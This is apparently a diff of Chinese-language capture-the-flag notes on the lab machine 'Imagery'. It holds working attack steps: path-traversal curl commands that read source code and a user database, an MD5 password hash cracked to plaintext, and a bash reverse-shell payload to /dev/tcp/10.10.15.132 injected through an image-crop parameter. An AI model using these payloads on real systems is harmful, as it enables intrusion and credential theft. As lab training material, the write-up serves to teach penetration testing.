@@ -520,10 +520,9 @@ for fn in "config" "app" "api_auth" "utils" "api_upload" "api_manage" "api_admin
 ```
 [★]$ mkdir app
 [★]$ cd app
-[~/app][★]$ for fn in "config" "app" "api_auth" "utils" "api_upload" "api_manage" "api_admin" "api_misc";do curl --path-as-is -s -b $'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc' http://10.129.13.194:8000/admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/${fn}.py -o ${fn}.py ;done
+[~/app][★]$ for fn in "config" "app" "api_auth" "utils" "api_upload" "api_manage" "api_admin" "api_misc" "api_edit";do curl --path-as-is -s -b $'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc' http://10.129.13.194:8000/admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/${fn}.py -o ${fn}.py ;done
 [~/app][★]$ ls
-api_admin.py  api_manage.py  api_upload.py  config.py
-api_auth.py   api_misc.py    app.py         utils.py
+api_admin.py  api_auth.py  api_edit.py  api_manage.py  api_misc.py  api_upload.py  app.py  config.py  utils.py
 ```
 ```
 [★]$ cat utils.py | grep password
@@ -604,3 +603,217 @@ SQLite	db.sqlite3, database.db
 JSON 存储	db.json, users.json, data.json
 YAML	config.yaml
 ```
+#### burpsuite右键点击‘Copy as curl command (bash)‘
+#### 直接粘贴到terminal , 后面加个-o db.json 
+```
+[★]$ curl --path-as-is -i -s -k -X $'GET' \
+    -H $'Host: 10.129.13.194:8000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Referer: http://10.129.13.194:8000/' -H $'DNT: 1' -H $'Connection: keep-alive' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-GPC: 1' -H $'Priority: u=0, i' \
+    -b $'session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aaUyqA.KwROsYojfe1wUpNkVNW4gCexfUc; {0a0cd94c-52ff-4e79-a0c4-d52033fa574e}=value' \
+    $'http://10.129.13.194:8000/admin/get_system_log?log_identifier=../../../../../../../../../../proc/self/cwd/db.json' -o db.json
+```
+```
+[★]$ sed -n '/^{/,$p' db.json > db1.json
+[~/app][★]$ jq . db1.json
+{
+  "users": [
+    {
+      "username": "admin@imagery.htb",
+      "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
+      "isAdmin": true,
+      "displayId": "a1b2c3d4",
+      "login_attempts": 0,
+      "isTestuser": false,
+      "failed_login_attempts": 0,
+      "locked_until": null
+    },
+    {
+      "username": "testuser@imagery.htb",
+      "password": "2c65c8d7bfbca32a3ed42596192384f6",
+      "isAdmin": false,
+      "displayId": "e5f6g7h8",
+      "login_attempts": 0,
+      "isTestuser": true,
+      "failed_login_attempts": 0,
+      "locked_until": null
+    }
+  ],
+  "images": [],
+  "image_collections": [
+    {
+      "name": "My Images"
+    },
+    {
+      "name": "Unsorted"
+    },
+    {
+      "name": "Converted"
+    },
+    {
+      "name": "Transformed"
+    }
+  ],
+  "bug_reports": []
+}
+```
+#### 打开网页https://crackstation.net/
+```
+5d9c1d507a3f76af1e5c97a3ad1eaa31         Unknown	Not found.
+2c65c8d7bfbca32a3ed42596192384f6 	 md5	        iambatman
+```
+#### 得到testuser@imagery.htb的密码为iambatman
+#### 源码审计（static code analysis）
+```
+[~/app][★]$ grep system *.py
+api_admin.py:@bp_admin.route('/admin/get_system_log', methods=['GET'])
+api_admin.py:def get_system_log():
+config.py:SYSTEM_LOG_FOLDER = 'system_logs'
+
+[★]$ grep subprocess *.py
+api_edit.py:import subprocess
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:            subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:    except subprocess.CalledProcessError as e:
+api_edit.py:        subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:    except subprocess.CalledProcessError as e:
+api_edit.py:        subprocess.run(command, capture_output=True, text=True, check=True)
+api_edit.py:    except subprocess.CalledProcessError as e:
+
+[~/app][★]$ grep subprocess *.py //空的原因可能存在任意文件读取（LFI / Path Traversal）
+
+[~/app][★]$ [★]$ pip install semgrep //安装 opengrep / semgrep
+
+[~/app][★]$ git clone https://github.com/returntocorp/semgrep-rules.git 
+
+[~/app][★]$semgrep scan -f semgrep-rules/python/ .
+<SNIP>
+ api_edit.py
+   ❯❯❱ semgrep-rules.python.flask.security.injection.subprocess-injection
+          ❰❰ Blocking ❱❱
+          Detected user input entering a `subprocess` call       
+          unsafely. This could result in a command injection     
+          vulnerability. An attacker could use this vulnerability
+          to execute arbitrary commands on the host, which allows
+          them to download malware, scan sensitive data, or run  
+          any command they wish on the server. Do not let users  
+          choose the command to run. In general, prefer to use   
+          Python API versions of system commands. If you must use
+          subprocess, use a dictionary to allowlist a set of     
+          commands.                                              
+                                                                 
+           45┆ subprocess.run(command, capture_output=True,
+               text=True, shell=True, check=True)          
+   
+   ❯❯❱ semgrep-rules.python.lang.security.audit.dangerous-subprocess-use-
+       audit                                                             
+          ❰❰ Blocking ❱❱
+          Detected subprocess function 'run' without a static   
+          string. If this data can be controlled by a malicious 
+          actor, it may be an instance of command injection.    
+          Audit the use of this call to ensure it is not        
+          controllable by an external resource. You may consider
+          using 'shlex.escape()'.                               
+                                                                
+           45┆ subprocess.run(command, capture_output=True,
+               text=True, shell=True, check=True)          
+   
+   ❯❯❱ semgrep-rules.python.lang.security.dangerous-subprocess-use
+          ❰❰ Blocking ❱❱
+          Detected subprocess function 'run' with user controlled
+          data. A malicious actor could leverage this to perform 
+          command injection. You may consider using              
+          'shlex.escape()'.                                      
+                                                                 
+           45┆ subprocess.run(command, capture_output=True,
+               text=True, shell=True, check=True)          
+   
+   ❯❯❱ semgrep-rules.python.lang.security.audit.subprocess-shell-true
+          ❰❰ Blocking ❱❱
+          Found 'subprocess' function 'run' with 'shell=True'.  
+          This is dangerous because this call will spawn the    
+          command using a shell process. Doing so propagates    
+          current shell settings and variables, which makes it  
+          much easier for a malicious actor to execute commands.
+          Use 'shell=False' instead.                            
+                                                                
+           ▶▶┆ Autofix ▶ False
+           45┆ subprocess.run(command, capture_output=True,
+               text=True, shell=True, check=True)          
+</SNIP>
+//会启动 shell，比如 /bin/sh -c "command"
+```
+### 上传图片，burpsuite拦截
+#### 在网站上登录testuser@imagery.htb的密码为iambatman
+```
+POST /upload_image HTTP/1.1
+Host: 10.129.13.194:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.13.194:8000/
+Content-Type: multipart/form-data; boundary=----geckoformboundary6464b1ffefee15c9f868848e263b8363
+Content-Length: 8875
+Origin: http://10.129.13.194:8000
+DNT: 1
+Connection: keep-alive
+Cookie: {0a0cd94c-52ff-4e79-a0c4-d52033fa574e}=value; session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aaVcJw.bLj_Xuve7iySW4YNGxrvsrZ1ZPA
+Sec-GPC: 1
+Priority: u=0
+
+------geckoformboundary6464b1ffefee15c9f868848e263b8363
+Content-Disposition: form-data; name="title"
+
+11
+------geckoformboundary6464b1ffefee15c9f868848e263b8363
+Content-Disposition: form-data; name="description"
+
+adg
+------geckoformboundary6464b1ffefee15c9f868848e263b8363
+Content-Disposition: form-data; name="group_name"
+
+My Images
+------geckoformboundary6464b1ffefee15c9f868848e263b8363
+Content-Disposition: form-data; name="file"; filename="gnome.jpg"
+Content-Type: image/jpeg
+
+ÿØÿà
+```
+#### 不是拦截download,而是下载后的My Images(1) ->Transform Image -> Operation:Crop
+#### 拦截 ‘Apply Transformation'
+```
+POST /apply_visual_transform HTTP/1.1
+Host: 10.129.13.194:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://10.129.13.194:8000/
+Content-Type: application/json
+Content-Length: 121
+Origin: http://10.129.13.194:8000
+DNT: 1
+Connection: keep-alive
+Cookie: {0a0cd94c-52ff-4e79-a0c4-d52033fa574e}=value; session=.eJxNjTEOgzAMRe_iuWKjRZno2FNELjGJJWJQ7AwIcfeSAanjf_9J74DAui24fwI4oH5-xlca4AGs75BZwM24KLXtOW9UdBU0luiN1KpS-Tdu5nGa1ioGzkq9rsYEM12JWxk5Y6Syd8m-cP4Ay4kxcQ.aaVcJw.bLj_Xuve7iySW4YNGxrvsrZ1ZPA
+Sec-GPC: 1
+Priority: u=0
+
+{"imageId":"f7857183-49c1-46f4-9ed7-6b258200f6b4","transformType":"crop","params":{"x":0,"y":0,"width":256,"height":256}}
+```
+#### 对y值进行测试
+```
+{"imageId":"f7857183-49c1-46f4-9ed7-6b258200f6b4","transformType":"crop","params":{"x":0,"y":"0；sleep 3;","width":256,"height":256}}
+```
+#### 对y值嵌入payload
+```
+[★]$ nc -lvnp 9000
+listening on [any] 9000 ...
+
+```
+```
+"y":"0;/bin/bash -c 'bin/bash -i >& /dev/tcp/10.10.15.132/9000 0>&1';",
+```
+#### URL 编码（Ctrl+U）
+
